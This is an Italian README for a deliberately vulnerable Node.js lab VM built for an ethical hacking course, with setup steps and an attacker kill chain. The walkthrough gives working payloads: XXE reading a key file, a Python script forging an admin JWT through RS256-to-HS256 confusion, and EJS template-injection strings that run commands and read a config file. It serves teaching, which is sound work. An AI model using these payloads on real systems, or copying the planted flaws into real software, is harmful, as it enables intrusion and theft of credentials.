# LegacyReportEngine — VM Laboratorio Ethical Hacking

## Struttura del progetto

```
legacy-report/
├── app.js                          ← Entry point Express
├── setup.js                        ← Setup iniziale (chiavi RSA, .config)
├── package.json
│
├── middleware/
│   └── jwtVerify.js                ← [VULN] JWT Algorithm Confusion (RS256→HS256)
│
├── routes/
│   ├── auth.js                     ← Login, JWKS endpoint
│   ├── reports.js                  ← [VULN] XXE in XML parser
│   └── management.js               ← [VULN] SSTI in EJS renderer
│
├── views/
│   ├── index.ejs                   ← Homepage [HINT: commento HTML]
│   ├── login.ejs                   ← Form login
│   ├── token.ejs                   ← Display JWT post-login
│   ├── reports.ejs                 ← Upload XML
│   ├── admin.ejs                   ← Pannello admin
│   └── 403.ejs                     ← Errore accesso
│
├── public/
│   ├── css/style.css
│   ├── js/dashboard.js             ← [HINT: commento con endpoint JWKS]
│   └── backup/
│       └── report_config.xml.bak  ← [HINT: schema JWT, algoritmo RS256]
│
└── keys/                           ← Generata da setup.js
    ├── private.pem
    └── public.pem
```

## Setup sulla VM Ubuntu Server

```bash
# 1. Installa Node.js 18+
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# 2. Copia il progetto in /opt/app/legacy-report
sudo mkdir -p /opt/app
sudo cp -r legacy-report /opt/app/
cd /opt/app/legacy-report

# 3. Installa dipendenze
npm install

# 4. Esegui setup (genera chiavi RSA + /opt/app/.config)
sudo node setup.js

# 5. Avvia l'applicazione
node app.js
# oppure con pm2:
# pm2 start app.js --name legacy-report
```

## Kill chain — prospettiva attaccante

### Fase 1 — Recon passiva
- Sorgente HTML di `/` → commento con `/management/dashboard`
- `/public/js/dashboard.js` → commento con `/.well-known/jwks.json`
- `/public/backup/report_config.xml.bak` → schema JWT, algoritmo RS256

### Fase 2 — XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE report [
  <!ENTITY xxe SYSTEM "file:///opt/app/legacy-report/keys/public.pem">
]>
<report>
  <title>&xxe;</title>
  <body>test</body>
</report>
```
Upload su `/reports` → riceve `public.pem` nel campo titolo.

### Fase 3 — Login guest
```
POST /api/auth/login
username=guest&password=guest123
```
Riceve JWT con `role: user`. Decodifica per capire la struttura.

### Fase 4 — JWT Algorithm Confusion (RS256 → HS256)
```python
import jwt, base64
from cryptography.hazmat.primitives import serialization

# Carica la public key ottenuta via XXE
with open('public.pem', 'rb') as f:
    pub_key = f.read()

# Forgia token con HS256 firmato con la chiave pubblica come secret
forged = jwt.encode(
    {"user": "admin", "role": "admin"},
    pub_key,
    algorithm="HS256"
)
print(forged)
```

### Fase 5 — Accesso admin
```bash
curl -H "Authorization: Bearer <token_forgiato>" \
     http://<VM_IP>:3000/management/dashboard
```

### Fase 6 — SSTI → RCE
Nel campo "Corpo del messaggio" del form template:
```
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```
Oppure lettura file:
```
<%= global.process.mainModule.require('fs').readFileSync('/opt/app/.config','utf8') %>
```

## Credenziali di accesso (non admin)
| Username | Password |
|----------|----------|
| guest    | guest123 |
| viewer   | view2024 |

Non esiste un account admin raggiungibile tramite login.
L'unico modo per ottenere `role: admin` è forgiare il token JWT.

## Note per il docente
- `/opt/app/.config` contiene `INTERNAL_NETWORK_HOST` e credenziali DB
  per il pivot alla rete interna (VM successiva)
- Le vulnerabilità sono documentate nei commenti del codice sorgente
- Ogni fase è indipendente ma necessaria per quella successiva
